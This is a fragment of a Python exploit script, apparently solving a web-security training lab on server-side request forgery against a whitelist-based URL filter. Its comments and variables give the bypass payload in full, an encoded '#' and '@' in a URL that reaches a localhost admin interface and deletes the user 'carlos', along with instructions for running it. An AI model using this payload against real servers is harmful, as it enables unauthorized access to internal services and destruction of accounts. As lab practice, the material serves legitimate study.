...
#Whitelist validating only the Url ending with "stock.weliketoshop.net"
#path of Deleting a user is http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos
#path of admin interface http://localhost%23@stock.weliketoshop.net/admin 
import requests
import sys
import urllib3
...
def delete_user(url):
    #ssrf payload
    delete_user_url="http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos" #SSRF payload request library will encode it once so we do not have to perform double URL encodind 
    ...
    admin_interface='http://localhost%23@stock.weliketoshop.net/admin'
...
#to run this code
#write in terminal
#python3 5-SSRF_whitelist-based_input_filter.py "Url of the lab"   